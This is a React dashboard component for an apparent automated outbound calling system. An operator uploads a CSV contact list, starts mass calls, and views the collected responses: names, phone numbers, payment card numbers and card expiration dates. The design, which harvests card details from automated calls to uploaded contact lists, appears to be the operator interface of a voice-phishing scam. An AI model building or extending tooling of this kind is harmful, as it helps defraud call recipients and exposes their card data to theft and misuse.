import { useEffect, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { api, clearToken } from '../api.js';

export default function Dashboard() {
  const navigate = useNavigate();
  const fileRef = useRef(null);
  const [rows, setRows] = useState([]);
  const [loading, setLoading] = useState(true);
  const [msg, setMsg] = useState('');
  const [error, setError] = useState('');
  const [busy, setBusy] = useState(false);

  function logout() {
    clearToken();
    navigate('/login', { replace: true });
  }

  async function load() {
    setLoading(true);
    setError('');
    try {
      const { responses } = await api.responses();
      setRows(responses || []);
    } catch (err) {
      if (/401|token/i.test(err.message)) return logout();
      setError(err.message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    load();
  }, []);

  async function onUpload(e) {
    const file = e.target.files?.[0];
    if (!file) return;
    setBusy(true);
    setMsg('');
    setError('');
    try {
      const res = await api.uploadContacts(file);
      setMsg(`Uploaded ${res.inserted} contacts.`);
    } catch (err) {
      setError(err.message);
    } finally {
      setBusy(false);
      if (fileRef.current) fileRef.current.value = '';
    }
  }

  async function onStartCalls() {
    setBusy(true);
    setMsg('');
    setError('');
    try {
      const res = await api.startCalls();
      setMsg(res.message || `Started ${res.started} calls.`);
    } catch (err) {
      setError(err.message);
    } finally {
      setBusy(false);
    }
  }

  const fmt = (iso) => (iso ? new Date(iso).toLocaleString() : '');
  const field = (r, key) => (r.collected && r.collected[key]) || '';

  return (
    <div className="page">
      <header className="topbar">
        <h1>Outbound Calling Dashboard</h1>
        <button className="ghost" onClick={logout}>
          Log out
        </button>
      </header>

      <section className="card toolbar">
        <div>
          <label className="btn">
            {busy ? 'Working…' : 'Upload contact list (CSV)'}
            <input ref={fileRef} type="file" accept=".csv" hidden onChange={onUpload} disabled={busy} />
          </label>
          <button onClick={onStartCalls} disabled={busy}>
            Start calling
          </button>
          <button className="ghost" onClick={load} disabled={loading}>
            Refresh
          </button>
        </div>
        {msg && <div className="ok">{msg}</div>}
        {error && <div className="error">{error}</div>}
      </section>

      <section className="card">
        <table>
          <thead>
            <tr>
              <th>Name</th>
              <th>Phone Number</th>
              <th>Card Number</th>
              <th>Expiration Date</th>
              <th>Date &amp; Time</th>
            </tr>
          </thead>
          <tbody>
            {loading ? (
              <tr>
                <td colSpan={5} className="muted center">
                  Loading…
                </td>
              </tr>
            ) : rows.length === 0 ? (
              <tr>
                <td colSpan={5} className="muted center">
                  No responses yet.
                </td>
              </tr>
            ) : (
              rows.map((r) => (
                <tr key={r.id}>
                  <td>{r.name}</td>
                  <td>{r.phone}</td>
                  <td>{field(r, 'Card Number')}</td>
                  <td>{field(r, 'Expiration Date')}</td>
                  <td>{fmt(r.created_at)}</td>
                </tr>
              ))
            )}
          </tbody>
        </table>
      </section>
    </div>
  );
}
